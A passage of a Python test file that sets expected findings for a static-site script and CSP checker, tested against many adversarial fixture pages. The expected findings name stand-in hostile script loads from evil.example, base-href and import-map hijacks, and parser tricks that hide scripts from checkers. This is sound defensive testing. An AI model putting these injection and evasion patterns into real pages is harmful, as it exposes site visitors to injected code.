    'a0_utf16le_promo': ('DRIFT', 'promo.html has a UTF-16 byte-order mark: a page must be UTF-8 with no NUL bytes'),
    'a1_utf16be_promo': ('DRIFT', 'promo.html has a UTF-16 byte-order mark: a page must be UTF-8 with no NUL bytes'),
    'a2_utf16le_noshell': ('DRIFT', '404.html has a UTF-16 byte-order mark: a page must be UTF-8 with no NUL bytes'),
    'a3_utf8bom_index_ok': ('OK', None),  # benign
    'a4_utf16le_index_pinned': ('DRIFT', 'index.html has a UTF-16 byte-order mark: a page must be UTF-8 with no NUL bytes'),
    'b0_xml_page': ('DRIFT', 'loads undeclared remote script https://evil.example/x.js'),
    'b1_xht_page': ('DRIFT', 'loads undeclared remote script https://evil.example/x.js'),
    'b2_mhtml_like_htm_upper': ('DRIFT', 'loads undeclared remote script https://evil.example/x.js'),
    'c0_pin_for_event': ('DRIFT', 'factory.js pin is not live: it carries attributes outside the pin template (event, for): o'),
    'c1_pin_language_vbscript': ('DRIFT', 'factory.js pin is not live: it carries attributes outside the pin template (language): onl'),
    'c2_pin_in_selfclosed_noscript': ('DRIFT', "index.html:a <script src='https://cdn.jsdelivr.net/gh/jebbdykstra99/subx-factory@000000000"),
    'c3_pin_in_selfclosed_template': ('DRIFT', 'factory.js pin is not live: it is not a direct child of <head> or <body> (open ancestors: '),
    'c4_pin_in_selfclosed_textarea': ('DRIFT', "index.html:a <script src='https://cdn.jsdelivr.net/gh/jebbdykstra99/subx-factory@000000000"),
    'c5_pin_in_selfclosed_title': ('DRIFT', "index.html:a <script src='https://cdn.jsdelivr.net/gh/jebbdykstra99/subx-factory@000000000"),
    'c6_pin_in_selfclosed_iframe': ('DRIFT', "index.html:a <script src='https://cdn.jsdelivr.net/gh/jebbdykstra99/subx-factory@000000000"),
    'c7_pin_after_frameset': ('DRIFT', 'factory.js pin is not live: the page has a <frameset> (a browser then never runs the body)'),
    'c8_pin_language_js_ok': ('DRIFT', 'factory.js pin is not live: it carries attributes outside the pin template (language): onl'),  # judgement call: N3 bars language= on the pin (Juno expected OK)
    'd0_nul_in_tagname': ('DRIFT', 'promo.html has NUL bytes'),
    'd10_vt_in_tag': ('OK', None),  # benign
    'd11_ff_in_tag': ('DRIFT', 'loads undeclared remote script https://evil.example/x.js'),
    'd12_noscript_breakout': ('DRIFT', "a browser sees <script src='https://evil.example/x.js'> that the checker does not (parsers"),
    'd13_select_ctx': ('DRIFT', 'loads undeclared remote script https://evil.example/x.js'),
    'd14_svg_p_breakout': ('DRIFT', 'loads undeclared remote script https://evil.example/x.js'),
    'd15_dsd_inline_ns': ('DRIFT', 'undeclared inline <script>'),
    'd16_math_mtext_script_ns': ('DRIFT', 'undeclared inline <script>'),
    'd1_cr_only_stub': ('OK', None),  # benign
    'd2_script_slash_attr': ('DRIFT', 'loads undeclared remote script https://evil.example/x.js'),
    'd3_dup_src': ('DRIFT', "<script> has duplicated attributes ['src'] (browsers use the first)"),
    'd4_upper_SCRIPT': ('DRIFT', 'loads undeclared remote script https://evil.example/x.js'),
    'd5_unquoted_quote': ('DRIFT', 'loads undeclared remote script https://evil.example/x.js?a"b'),
    'd6_nested_template': ('DRIFT', 'loads undeclared remote script https://evil.example/x.js'),
    'd7_unclosed_script_eof': ('DRIFT', 'undeclared inline <script>'),
    'd8_unclosed_comment_eof': ('OK', None),  # benign
    'd9_plaintext': ('DRIFT', '<plaintext>: everything after <plaintext> is text to a browser but markup to the checker'),
    'e0_ls_ends_line_comment': ('DRIFT', 'inline statically imports https://evil.example/x.js'),
    'e10_str_with_comment': ('DRIFT', 'inline statically imports https://evil.example/x.js'),
    'e11_tpl_literal': ('DRIFT', 'inline <script> injects or evaluates code at runtime (import()'),
    'e12_hashbang': ('DRIFT', 'inline statically imports https://evil.example/x.js'),
    'e13_regex_slashes': ('DRIFT', 'inline statically imports https://evil.example/x.js'),
    'e14_export_from_bom': ('DRIFT', 'inline statically imports https://evil.example/x.js'),
    'e15_keep_htmlcomment_gap': ('OK', None),  # known gap (HTML-like comment in a classic script; CSP is the wall)
    'e16_keep_arrow_comment_gap': ('OK', None),  # known gap (HTML-like comment in a classic script; CSP is the wall)
    'e17_keep_ls_gap': ('DRIFT', 'app.js injects or evaluates code at runtime (import//x\u2028()'),
    'e18_keep_bom_gap': ('DRIFT', 'app.js injects or evaluates code at runtime (import\ufeff()'),
    'e19_keep_ns_bom_gap': ('DRIFT', 'app.js injects or evaluates code at runtime (import\ufeff()'),
    'e1_cr_ends_line_comment': ('DRIFT', 'undeclared inline <script>'),
    'e20_keep_ns_htmlcomment': ('OK', None),  # known gap (HTML-like comment in a classic script; CSP is the wall)
    'e21_keep_ns_eval': ('DRIFT', 'app.js is loaded on noShell page terms.html and evaluates a string as code (eval(): not al'),
    'e22_keep_ns_function': ('DRIFT', 'app.js is loaded on noShell page terms.html and evaluates a string as code (Function(): no'),
    'e2_ps_ends_line_comment': ('DRIFT', 'inline statically imports https://evil.example/x.js'),
    'e3_bom_ws_after_import': ('DRIFT', 'inline statically imports https://evil.example/x.js'),
    'e4_bom_ws_before_import': ('DRIFT', 'inline statically imports https://evil.example/x.js'),
    'e5_nbsp_before_import': ('DRIFT', 'inline statically imports https://evil.example/x.js'),
    'e6_ls_dynamic': ('DRIFT', 'inline <script> injects or evaluates code at runtime (import//x\u2028()'),
    'e7_noshell_ls': ('DRIFT', 'inline statically imports https://evil.example/x.js'),
    'e8_noshell_bom': ('DRIFT', 'inline statically imports https://evil.example/x.js'),
    'e9_noshell_bom_dyn': ('DRIFT', 'inline <script> injects or evaluates code at runtime (import\ufeff()'),
    'f0_importmap_remap': ('DRIFT', '<script type=importmap>: an import map can remap module specifiers; not allowed unless she'),
    'f10_404_tpl_ws_variant': ('DRIFT', 'inline declaration for 404.html'),
    'f11_404_bom_before': ('OK', None),  # benign
    'f12_404_tpl_nbsp': ('DRIFT', 'inline declaration for 404.html'),
    'f13_marker_space_variant': ('DRIFT', 'go.html is listed in shell.redirects but is not a redirect stub: it is outside the redirec'),
    'f14_marker_dup_plus_hidden': ('OK', None),  # benign
    'f15_svg_animate_js_ns': ('DRIFT', 'undeclared <animate values=javascript:>'),
    'f16_href_tab_js_ns': ('DRIFT', 'undeclared <a href=javascript:>'),
    'f17_href_leading_space_js_ns': ('DRIFT', 'undeclared <a href=javascript:>'),
    'f18_svg_set_ns': ('DRIFT', 'undeclared <set to=javascript:>'),
    'f19_jscript_type_ns': ('DRIFT', 'undeclared inline <script>'),
    'f1_base_noshell_keep': ('DRIFT', "<base href='https://evil.example/'> retargets every relative src (not allowed)"),
    'f20_xjs_type_pinned': ('DRIFT', 'undeclared inline <script>'),
    'f21_speculation_ns': ('DRIFT', 'undeclared inline <script>'),
    'f2_base_after_noshell': ('DRIFT', "<base href='https://evil.example/'> retargets every relative src (not allowed)"),
    'f3_404_ok': ('OK', None),  # benign
    'f4_404_crlf_ok': ('OK', None),  # benign
    'f5_404_cr_only': ('OK', None),  # benign
    'f6_404_appended_evil': ('DRIFT', 'loads undeclared remote script https://evil.example/x.js'),
    'f7_404_appended_img': ('DRIFT', 'undeclared <img onerror=>'),
    'f8_404_second_template': ('OK', None),  # benign
    'f9_404_tpl_trailing_code': ('DRIFT', 'inline <script> injects or evaluates code at runtime (import()'),
}
ok(sorted(ADV9_EXPECT) == sorted(x for x in os.listdir(ADV9) if os.path.isdir(os.path.join(ADV9, x))), 'every adv9 fixture room has an expectation')
for name, (st_, needle) in sorted(ADV9_EXPECT.items()):
    with tempfile.TemporaryDirectory() as t:
        d = os.path.join(t, name); shutil.copytree(os.path.join(ADV9, name), d)
        r = run(d)
        good = r['status'] == st_ and (needle is None or any(needle in x for x in r['findings']))
        if st_ == 'OK':
            good = good and not r['findings'] and not r['warnings']
        ok(good, 'adv9 %s = %s%s (%s %s %s)' % (name, st_, ' with "%s"' % needle if needle else '', r['status'], r['findings'][:3], r['warnings'][:3]))

# adv10 (Juno K2 at 3cf3cc8): CSP placement (D1-D3), pin-folder exactness (C1), reCAPTCHA (C2), hosting redirects (C3),
# worker-src. Run as one checker call with the fixture's own legacy list (k* rooms off it unless named legacy, n* on it).
ADV10 = os.path.join(ROOT, 'test', 'fixtures', 'shell_drift', 'adv10')
ADV10_EXPECT = {
    'k00_strict_ok': ('OK', None),
    'k01_missing_nonlegacy': ('DRIFT', 'CSP rule: no Content-Security-Policy on 1 of 1 pages (index.html): add the shell/csp.md me'),
    'k02_missing_legacy': ('WARN', 'CSP rule (legacy room on tools/csp_legacy_rooms.json, WARN until its migration PR): no Con'),
    'k03_false_offlist': ('DRIFT', 'CSP rule: cspRequired:false is allowed only for rooms on tools/csp_legacy_rooms.json (site'),
    'k04_false_legacy': ('WARN', 'CSP rule (legacy room on tools/csp_legacy_rooms.json, WARN until its migration PR): no Con'),
    'k04b_true_legacy_missing': ('DRIFT', 'CSP rule: no Content-Security-Policy on 1 of 1 pages (index.html): add the shell/csp.md me'),
    'k05_bare_host': ('DRIFT', 'CSP rule: CSP is not strict on index.html: script-src source https://cdn.jsdelivr.net is n'),
    'k06_repo': ('DRIFT', 'index.html:1 factory.js pin is blocked by index.html:1 <meta> CSP (script-src/default-src '),
    'k07_tag': ('DRIFT', 'index.html:1 factory.js pin is blocked by index.html:1 <meta> CSP (script-src/default-src '),
    'k08_branch': ('DRIFT', 'index.html:1 factory.js pin is blocked by index.html:1 <meta> CSP (script-src/default-src '),
    'k09_short_sha': ('DRIFT', 'index.html:1 factory.js pin is blocked by index.html:1 <meta> CSP (script-src/default-src '),
    'k10_unsafe_inline': ('DRIFT', "CSP rule: CSP is not strict on index.html: script-src has 'unsafe-inline'"),
    'k11_unsafe_eval': ('DRIFT', "CSP rule: CSP is not strict on index.html: script-src has 'unsafe-eval'"),
    'k12_strict_dynamic': ('DRIFT', 'index.html:1 factory.js pin is blocked by index.html:1 <meta> CSP (script-src/default-src '),
    'k13_star': ('DRIFT', 'CSP rule: CSP is not strict on index.html: script-src source * is not allowed in a strict '),
    'k14_https': ('DRIFT', 'CSP rule: CSP is not strict on index.html: script-src source https: is not allowed in a st'),
    'k15_data': ('DRIFT', 'CSP rule: CSP is not strict on index.html: script-src source data: is not allowed in a str'),
    'k16_blob': ('DRIFT', 'CSP rule: CSP is not strict on index.html: script-src source blob: is not allowed in a str'),
    'k16b_nonce': ('DRIFT', 'CSP rule: CSP is not strict on index.html: script-src has a nonce (a static page cannot ro'),
    'k16c_evil_host': ('DRIFT', 'CSP rule: CSP is not strict on index.html: script-src source https://evil.example is not a'),
    'k16d_jsdelivr_npm_any': ('DRIFT', 'CSP rule: CSP is not strict on index.html: script-src source https://cdn.jsdelivr.net/npm/'),
    'k16e_upper_unsafe': ('DRIFT', "CSP rule: CSP is not strict on index.html: script-src has 'UNSAFE-INLINE'"),
    'k17_no_objsrc': ('DRIFT', "CSP rule: CSP is not strict on index.html: object-src is not 'none'"),
    'k18_no_baseuri': ('DRIFT', "CSP rule: CSP is not strict on index.html: base-uri is not 'none'"),
    'k19_default_src_only_ok': ('OK', None),
    'k20_default_star': ('DRIFT', 'CSP rule: CSP is not strict on index.html: default-src source * is not allowed in a strict'),
    'k20b_no_script_or_default': ('DRIFT', 'CSP rule: CSP is not strict on index.html: no script-src or default-src'),
    'k21_two_meta_strict_weak_ok': ('OK', None),
    'k22_two_meta_both_weak': ('DRIFT', 'CSP rule: CSP is not strict on index.html: script-src source * is not allowed in a strict '),
    'k23_meta_after_script': ('DRIFT', 'CSP rule: CSP is not strict on index.html: the meta CSP is not the first element in <head>'),
    'k24_meta_in_body': ('DRIFT', 'CSP rule: CSP is not strict on index.html: the meta CSP is not the first element in <head>'),
    'k25_upper_HTTP_EQUIV_ok': ('OK', None),
    'k26_http_equiv_leading_space': ('DRIFT', "CSP rule: CSP is not strict on index.html: http-equiv=' Content-Security-Policy' has surro"),
    'k27_script_src_elem_star': ('DRIFT', 'CSP rule: CSP is not strict on index.html: script-src-elem source * is not allowed in a st'),
    'k28_dup_directive_first_weak': ('DRIFT', 'CSP rule: CSP is not strict on index.html: script-src source * is not allowed in a strict '),
    'k29_comma_in_meta': ('DRIFT', 'CSP rule: CSP is not strict on index.html: the meta CSP contains a comma: a <meta> deliver'),
    'k30_head_closed_by_div': ('DRIFT', 'CSP rule: CSP is not strict on index.html: the meta CSP is not the first element in <head>'),
    'k31_head_closed_by_text': ('DRIFT', 'CSP rule: CSP is not strict on index.html: the meta CSP is not the first element in <head>'),
    'k32_after_head_p': ('DRIFT', 'CSP rule: CSP is not strict on index.html: the meta CSP is not the first element in <head>'),
    'k32b_after_head_meta_ok': ('OK', None),
    'k32c_no_head_img': ('DRIFT', 'CSP rule: CSP is not strict on index.html: the meta CSP is not the first element in <head>'),
    'k33_csp_in_noscript': ('DRIFT', 'index.html:a <meta http-equiv=\'Content-Security-Policy\' content="script-src \'self\' https:/'),
    'k34_csp_in_template': ('DRIFT', 'CSP rule: CSP is not strict on index.html: the meta CSP is not the first element in <head>'),
    'k35_firebase_header_ok': ('OK', None),
    'k36_headers_file_ok': ('OK', None),
    'k37_firebase_header_partial': ('DRIFT', 'CSP rule: no Content-Security-Policy on 1 of 2 pages (promo.html): add the shell/csp.md me'),
    'k38_csp_other_sha_only': ('DRIFT', 'index.html:1 factory.js pin is blocked by index.html:1 <meta> CSP (script-src/default-src '),
    'k39_extra_foreign_sha_root': ('DRIFT', 'CSP rule: CSP is not strict on index.html: script-src source https://cdn.jsdelivr.net/gh/j'),
    'k40_pin_sha_repo_root': ('DRIFT', 'CSP rule: CSP is not strict on index.html: script-src source https://cdn.jsdelivr.net/gh/j'),
    'k41_recaptcha_bare_google': ('DRIFT', 'CSP rule: CSP is not strict on index.html: script-src source https://www.google.com is not'),
    'k41b_recaptcha_bare_gstatic': ('DRIFT', 'CSP rule: CSP is not strict on index.html: script-src source https://www.gstatic.com/ is n'),
    'k42_recaptcha_paths_ok': ('DRIFT', 'CSP rule: CSP is not strict on index.html: script-src source https://www.google.com/recapt'),
    'k42b_firebase_exact_ok': ('OK', None),
    'k42c_firebase_any': ('DRIFT', 'CSP rule: CSP is not strict on index.html: script-src source https://www.gstatic.com/fireb'),
    'k43_firebase_redirect_remote': ('DRIFT', 'firebase.json redirects sends /go.js to an outside origin (https://cdn.jsdelivr.net/npm/ev'),
    'k44_hash_unmatched': ('DRIFT', "CSP rule: CSP is not strict on index.html: script-src lists hash 'sha256-AAAAAAAAAAAA that"),
    'k45_worker_src_star': ('DRIFT', 'CSP rule: CSP is not strict on index.html: worker-src has * (a worker may load from anywhe'),
    'k46_meta_after_base': ('DRIFT', "index.html:1 <base href='/'> retargets every relative src (not allowed)"),
    'k50_emoji_range_cdn': ('WARN', 'index.html:1 emoji-picker-element@1 has no SRI pin: load it from an exact-version folder l'),
    'k51_emoji_exact_folder_ok': ('OK', None),
    'k52_emoji_cdn_sri_only': ('WARN', 'index.html:1 emoji-picker-element@1.29.1 has no SRI pin: load it from an exact-version fol'),
    'k53_emoji_folder_no_trailing_slash': ('WARN', 'index.html:1 emoji-picker-element@1.29.1 has no SRI pin: load it from an exact-version fol'),
    'n00_xsl_page': ('DRIFT', 'p.xsl:1 loads undeclared remote script https://evil.example/x.js'),
    'n01_xslt_page': ('DRIFT', 'p.xslt:1 loads undeclared remote script https://evil.example/x.js'),
    'n02_svg_href_script': ('DRIFT', 'p.svg:1 <script> contains markup after an <svg>/<math>: in foreign content a browser parse'),
    'n02b_svg_xlink_script': ('DRIFT', 'p.svg:1 <script> contains markup after an <svg>/<math>: in foreign content a browser parse'),
    'n03_meta_charset_1252': ('DRIFT', "index.html:1 <meta charset='windows-1252'>: a declared charset other than utf-8 (the page "),
    'n04_httpequiv_ctype_sjis': ('DRIFT', "index.html:1 <meta http-equiv Content-Type charset='shift_jis'>: a declared charset other "),
    'n05_nul_in_text': ('DRIFT', 'index.html has NUL bytes: a page must be UTF-8 with no NUL bytes'),
    'n06_xml_encoding_utf16': ('DRIFT', "p.xhtml:1 <?xml encoding='utf-16'?>: a declared charset other than utf-8 (the page must be"),
    'n07_invalid_utf8': ('DRIFT', 'p.html has bytes that are not valid UTF-8 (first at offset 12): a page must be UTF-8 with '),
    'n08_script_charset': ('DRIFT', "index.html:1 <script charset='iso-8859-1'>: a declared charset other than utf-8 (the page "),
    'n10_pin_end_of_body_ok': ('WARN', 'CSP rule (legacy room on tools/csp_legacy_rooms.json, WARN until its migration PR): no Con'),
    'n11_body_pin_after_frameset': ('DRIFT', 'index.html:1 factory.js pin is not live: the page has a <frameset> (a browser then never r'),
    'n12_body_pin_in_noscript': ('DRIFT', "index.html:a <script src='https://cdn.jsdelivr.net/gh/jebbdykstra99/subx-factory@000000000"),
    'n13_body_pin_in_template': ('DRIFT', 'index.html:1 factory.js pin is not live: it is not a direct child of <head> or <body> (ope'),
    'n14_body_selfclosed_noscript': ('DRIFT', "index.html:a <script src='https://cdn.jsdelivr.net/gh/jebbdykstra99/subx-factory@000000000"),
    'n15_body_selfclosed_template': ('DRIFT', 'index.html:1 factory.js pin is not live: it is not a direct child of <head> or <body> (ope'),
    'n16_body_selfclosed_textarea': ('DRIFT', "index.html:a <script src='https://cdn.jsdelivr.net/gh/jebbdykstra99/subx-factory@000000000"),
    'n17_body_selfclosed_iframe': ('DRIFT', "index.html:a <script src='https://cdn.jsdelivr.net/gh/jebbdykstra99/subx-factory@000000000"),
    'n18_body_pin_in_svg': ('DRIFT', 'index.html:1 factory.js pin is not live: it is not a direct child of <head> or <body> (ope'),
    'n19_body_pin_extra_attr': ('DRIFT', 'index.html:1 factory.js pin is not live: it carries attributes outside the pin template (e'),
    'n20_body_pin_type_module': ('DRIFT', 'index.html:1 factory.js pin has type=module: document.currentScript is null there, so the '),
    'n21_body_xmp': ('DRIFT', 'index.html runs no shell (no live, running factory.js pin): the main page must run it'),
    'n22_body_noembed': ('DRIFT', 'index.html runs no shell (no live, running factory.js pin): the main page must run it'),
    'n23_body_noframes': ('DRIFT', 'index.html runs no shell (no live, running factory.js pin): the main page must run it'),
    'n24_after_body_ok': ('WARN', 'CSP rule (legacy room on tools/csp_legacy_rooms.json, WARN until its migration PR): no Con'),
    'n25_body_svg_end_tag_trick': ('WARN', 'CSP rule (legacy room on tools/csp_legacy_rooms.json, WARN until its migration PR): no Con'),
    'n26_body_math_selfclose': ('WARN', 'CSP rule (legacy room on tools/csp_legacy_rooms.json, WARN until its migration PR): no Con'),
    'n27_body_template_in_svg': ('DRIFT', 'index.html:1 factory.js pin is inert (inside <template>): it does not run'),
    'n28_body_pin_language': ('DRIFT', 'index.html:1 factory.js pin is not live: it carries attributes outside the pin template (l'),
    'n29_body_pin_nomodule': ('DRIFT', 'index.html:1 factory.js pin is not live: it carries attributes outside the pin template (n'),
    'n30_ns_settimeout_string_inj': ('DRIFT', 'app.js is loaded on noShell page terms.html and evaluates a string as code (setTimeout("):'),
    'n31_ns_docwrite_inj': ('DRIFT', 'app.js is loaded on noShell page terms.html and evaluates a string as code (document.write'),
    'n32_ns_settimeout_fn_ok': ('WARN', 'CSP rule (legacy room on tools/csp_legacy_rooms.json, WARN until its migration PR): no Con'),
    'n33_ns_function_inj': ('DRIFT', 'app.js is loaded on noShell page terms.html and evaluates a string as code (Function(): no'),
    'n34_ns_eval_noinj': ('DRIFT', 'app.js is loaded on noShell page terms.html and evaluates a string as code (eval(): not al'),
    'n35_ns_docwriteln': ('DRIFT', 'app.js is loaded on noShell page terms.html and evaluates a string as code (document.write'),
    'n36_ns_setinterval_tpl': ('DRIFT', 'app.js is loaded on noShell page terms.html and evaluates a string as code (setInterval(`)'),
    'n37_ns_window_eval': ('DRIFT', 'app.js is loaded on noShell page terms.html and evaluates a string as code (eval(): not al'),
    'n38_ns_indirect_eval': ('DRIFT', 'app.js injects or evaluates code at runtime (,eval)) without a declared "injects" reason'),
    'n40_importmap_local_declared_ok': ('WARN', 'CSP rule (legacy room on tools/csp_legacy_rooms.json, WARN until its migration PR): no Con'),
    'n41_importmap_remote_declared': ('DRIFT', 'index.html:1 import map points a specifier at remote https://evil.example/a.js'),
    'n42_importmap_external': ('DRIFT', 'index.html:1 <script type=importmap src=...>: external import maps are not allowed'),
    'n43_importmap_undeclared_flag': ('DRIFT', 'index.html:1 <script type=importmap>: an import map can remap module specifiers; not allow'),
    'n44_importmap_remap_pin': ('DRIFT', 'index.html:1 undeclared import map (sha256 91d7e5f84127)'),
}

ok(sorted(ADV10_EXPECT) == sorted(x for x in os.listdir(ADV10) if os.path.isdir(os.path.join(ADV10, x))), 'every adv10 fixture room has an expectation')
with tempfile.TemporaryDirectory() as t:
    lf = os.path.join(t, 'leg.json')
    json.dump({'rooms': json.load(open(os.path.join(ADV10, 'legacy10.json')))}, open(lf, 'w'))
    subprocess.run([sys.executable, os.path.join(ROOT, 'tools', 'shell_drift.py'), '--csp-legacy', lf, '--json', os.path.join(t, 'o.json')]
                   + [os.path.join(ADV10, n) for n in sorted(ADV10_EXPECT)], capture_output=True, text=True)
    res = {os.path.basename(x['room'].rstrip('/')): x for x in json.load(open(os.path.join(t, 'o.json')))}
for name, (st_, needle) in sorted(ADV10_EXPECT.items()):
    r = res.get(name) or {'status': 'missing', 'findings': [], 'warnings': []}
    good = r['status'] == st_ and (needle is None or any(needle in x for x in r['findings'] + r['warnings']))
    if st_ == 'OK':
        good = good and not r['findings'] and not r['warnings']
    ok(good, 'adv10 %s = %s%s (%s %s %s)' % (name, st_, ' with "%s"' % needle[:50] if needle else '', r['status'], r['findings'][:2], r['warnings'][:2]))

# adv11 (Juno K2 at bca0b62): B1 CSP tokenizer (browsers split only on ASCII whitespace) and vercel routes/headers
# redirects (C3). Non-legacy rooms, so every CSP problem is DRIFT.
ADV11 = os.path.join(ROOT, 'test', 'fixtures', 'shell_drift', 'adv11')
_B1 = 'only printable ASCII and tab/LF/FF/CR/space are allowed'
ADV11_EXPECT = {
    'e12_nbsp_in_first_directive': ('DRIFT', 'U+00A0: ' + _B1),
    'e12b_nbsp_entity': ('DRIFT', 'U+00A0: ' + _B1),
    'e12c_vt_in_first_directive': ('DRIFT', 'U+000B: ' + _B1),
    'e12d_u2028_in_first': ('DRIFT', 'U+2028: ' + _B1),
    'e12e_x1f_in_first': ('DRIFT', 'U+001F: ' + _B1),
    'e12f_header_nbsp': ('DRIFT', 'firebase.json header CSP for **: the CSP value has character U+00A0'),
    'e13_nbsp_in_object_src': ('DRIFT', 'U+00A0: ' + _B1),
    'r11_vercel_routes_legacy': ('DRIFT', 'vercel.json routes sends /go.js to an outside origin'),
    'r11b_vercel_headers_location': ('DRIFT', 'vercel.json headers Location sends /go.js to an outside origin'),
}
ok(sorted(ADV11_EXPECT) == sorted(x for x in os.listdir(ADV11) if os.path.isdir(os.path.join(ADV11, x))), 'every adv11 fixture room has an expectation')
for name, (st_, needle) in sorted(ADV11_EXPECT.items()):
    with tempfile.TemporaryDirectory() as t:
        d = os.path.join(t, name); shutil.copytree(os.path.join(ADV11, name), d)
        r = run(d, csp=True, legacy=[])
        ok(r['status'] == st_ and any(needle in x for x in r['findings']),
           'adv11 %s = %s with "%s" (%s %s)' % (name, st_, needle[:50], r['status'], r['findings'][:2]))

# D1-D3, C1-C3 and worker-src unit rooms (non-legacy: every CSP problem is DRIFT)
with tempfile.TemporaryDirectory() as t:
    _Z = '0' * 40
    _PIN = ('<script src="https://cdn.jsdelivr.net/gh/jebbdykstra99/subx-factory@%s/shell/v1.2.6/factory.js" integrity="sha384-'
            'P1qjkeL0BmNyUksLCAUJJ0Lws2AX1bx7hdOGxVHEbHjXQsof63F7DxNAZQbDXFpY" crossorigin="anonymous"></script>' % _Z)
    _DIR = 'https://cdn.jsdelivr.net/gh/jebbdykstra99/subx-factory@%s/shell/v1.2.6/' % _Z
    _TAIL = "; object-src 'none'; base-uri 'none'"

    def _m(extra='', tail='', equiv='Content-Security-Policy'):
        return '<meta http-equiv="%s" content="script-src \'self\' %s%s%s%s">' % (equiv, _DIR, (' ' + extra) if extra else '', _TAIL, tail)

    def c_room(name, html, shell=None, files=None):
        d = os.path.join(t, name); os.makedirs(d)
        sh = {'base': 'v1.2.6', 'fork': False}; sh.update(shell or {})
        json.dump({'siteId': name, 'shell': sh}, open(os.path.join(d, 'site.json'), 'w'))
        open(os.path.join(d, 'index.html'), 'w').write(html)
        for fn, c in (files or {}).items():
            open(os.path.join(d, fn), 'w').write(c)
        return run(d, csp=True, legacy=[])

    def c_ok(label, r, want, needle=None):
        good = r['status'] == want and (needle is None or any(needle in x for x in r['findings']))
        ok(good, 'CSP %s = %s (%s %s)' % (label, want, r['findings'][:2], r['warnings'][:2]))

    FIRST = 'not the first element in <head>'
    c_ok('D1: <!DOCTYPE>, comment, <meta charset> before the meta', c_room('d1a', '<!DOCTYPE html><!-- x --><html>\n<head>\n  <meta charset="utf-8">\n  ' + _m() + _PIN + '</head><body></body></html>'), 'OK')
    c_ok('D1: <title> before the meta', c_room('d1b', '<html><head><title>t</title>' + _m() + _PIN + '</head></html>'), 'DRIFT', FIRST)
    c_ok('D1: <meta name=viewport> before the meta', c_room('d1c', '<html><head><meta name="viewport" content="x">' + _m() + _PIN + '</head></html>'), 'DRIFT', FIRST)
    c_ok('D1: <link> before the meta', c_room('d1d', '<html><head><link rel="icon" href="a.png">' + _m() + _PIN + '</head></html>'), 'DRIFT', FIRST)
    c_ok('D1: text before <html>', c_room('d1e', 'hi<html><head>' + _m() + _PIN + '</head></html>'), 'DRIFT', FIRST)
    c_ok('D1: <style> before the meta', c_room('d1f', '<html><head><style>a{}</style>' + _m() + _PIN + '</head></html>'), 'DRIFT', FIRST)
    c_ok('D1: two metas first, both strict', c_room('d1g', '<html><head>' + _m() + _m() + _PIN + '</head></html>'), 'OK')
    c_ok('D2: comma in a meta', c_room('d2a', '<html><head>' + _m('', ', script-src *') + _PIN + '</head></html>'), 'DRIFT', 'contains a comma')
    c_ok('D2: comma in a header still splits (strict, weak = OK)', c_room('d2b', '<html><head>' + _PIN + '</head></html>', files={
        '_headers': "/*\n  Content-Security-Policy: script-src 'self' %s%s, script-src *\n" % (_DIR, _TAIL)}), 'OK')
    c_ok('D3: http-equiv with a trailing space', c_room('d3a', '<html><head>' + _m(equiv='Content-Security-Policy ') + _PIN + '</head></html>'), 'DRIFT', 'surrounding whitespace')
    c_ok('D3: http-equiv with a tab', c_room('d3b', '<html><head>' + _m(equiv='\tcontent-security-policy') + _PIN + '</head></html>'), 'DRIFT', 'surrounding whitespace')
    c_ok('B1: tab/LF/FF/CR between tokens = OK', c_room('b1a', '<html><head>' + _m().replace("script-src 'self' ", "script-src\t'self'\n\x0c\r ") + _PIN + '</head></html>'), 'OK')
    c_ok('B1: directive name outside [a-z0-9-]', c_room('b1b', '<html><head>' + _m('', "; script_src *") + _PIN + '</head></html>'), 'DRIFT', 'invalid directive name')
    c_ok('B1: uppercase directive name = OK', c_room('b1c', '<html><head>' + _m().replace('script-src', 'SCRIPT-SRC') + _PIN + '</head></html>'), 'OK')
    c_ok('B1: NBSP in a _headers CSP with a strict meta too', c_room('b1d', '<html><head>' + _m() + _PIN + '</head></html>', files={
        '_headers': "/*\n  Content-Security-Policy: object-src\u00a0'none'\n"}), 'DRIFT', '_headers header CSP')
    NOTPIN = "is not this page's pin folder"
    c_ok('C1: pin folder plus factory.js file = OK', c_room('c1a', '<html><head>' + _m(_DIR + 'factory.js') + _PIN + '</head></html>'), 'OK')
    c_ok('C1: pin SHA, other version folder', c_room('c1b', '<html><head>' + _m(_DIR.replace('v1.2.6', 'v1.2.5')) + _PIN + '</head></html>'), 'DRIFT', NOTPIN)
    c_ok('C1: pin SHA, /factory/ folder on a /shell/ pin', c_room('c1c', '<html><head>' + _m(_DIR.replace('shell/v1.2.6', 'factory')) + _PIN + '</head></html>'), 'DRIFT', NOTPIN)
    c_ok('C1: only a foreign SHA folder (pin not listed)', c_room('c1d', '<html><head>' + _m().replace(_Z, '2' * 40) + _PIN + '</head></html>'), 'DRIFT')
    _pre = _PIN.replace('shell/v1.2.6/', 'factory/')
    _pd = 'https://cdn.jsdelivr.net/gh/jebbdykstra99/subx-factory@%s/factory/' % _Z
    _pp = SD.csp_policies("script-src 'self' %s%s" % (_pd, _TAIL))[0]
    ok(SD.csp_weak(_pp, set(), True, {_pd}) == [] and SD.csp_weak(_pp, set(), True, {_DIR}) != [],
       'C1: the pre-merge /factory/ folder is the pin source only for a /factory/ pin')
    RC = 'https://www.google.com/recaptcha/api.js https://www.gstatic.com/recaptcha/releases/'
    c_ok('C2: exact reCAPTCHA sources with shell.recaptcha: true', c_room('c2a', '<html><head>' + _m(RC) + _PIN + '</head></html>', {'recaptcha': True}), 'OK')
    c_ok('C2: enterprise.js with shell.recaptcha: true', c_room('c2b', '<html><head>' + _m('https://www.google.com/recaptcha/enterprise.js') + _PIN + '</head></html>', {'recaptcha': True}), 'OK')
    c_ok('C2: exact reCAPTCHA sources without the opt-in', c_room('c2c', '<html><head>' + _m(RC) + _PIN + '</head></html>'), 'DRIFT', 'shell.recaptcha: true')
    c_ok('C2: /recaptcha/ folder even with the opt-in', c_room('c2d', '<html><head>' + _m('https://www.google.com/recaptcha/') + _PIN + '</head></html>', {'recaptcha': True}), 'DRIFT', 'not allowed in a strict CSP')
    c_ok('C2: gstatic /recaptcha/about/ with the opt-in', c_room('c2e', '<html><head>' + _m('https://www.gstatic.com/recaptcha/about/js/main.min.js') + _PIN + '</head></html>', {'recaptcha': True}), 'DRIFT', 'not allowed in a strict CSP')
    c_ok('C2: shell.recaptcha must be a boolean', c_room('c2f', '<html><head>' + _m() + _PIN + '</head></html>', {'recaptcha': 'yes'}), 'DRIFT', 'shell.recaptcha must be true or false')
    OUT = 'to an outside origin'
